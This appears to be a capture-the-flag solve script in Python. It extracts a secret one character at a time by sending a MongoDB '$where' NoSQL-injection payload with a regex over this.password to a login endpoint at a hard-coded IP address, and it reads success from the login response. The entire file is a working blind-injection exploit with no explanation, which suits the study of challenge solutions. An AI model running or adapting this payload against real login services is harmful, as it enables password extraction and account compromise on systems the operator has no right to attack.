#!/usr/bin/env python3
import requests
import string

alphabet = "{}_" + string.digits + string.ascii_lowercase + string.punctuation
alphabet = (
    alphabet.replace("*", "")
    .replace("+", "")
    .replace(".", "")
    .replace("?", "")
    .replace("\\", "")
    .replace("|", "")
)
alphabet += "."
url = "http://35.232.242.42:5249"
flag = "squ1rrel{"

s = requests.Session()

while True:
    for c in alphabet:
        print("Trying:", flag + c, end="\r")
        payload = {"$where": f"this.password.match(/{flag}{c}.*/)"}
        resp = s.post(url + "/login", json=payload)
        if "Login successful!" in resp.text:
            flag += c
            break
    if flag[-1] == "}":
        break

print("\nFlag:", flag)
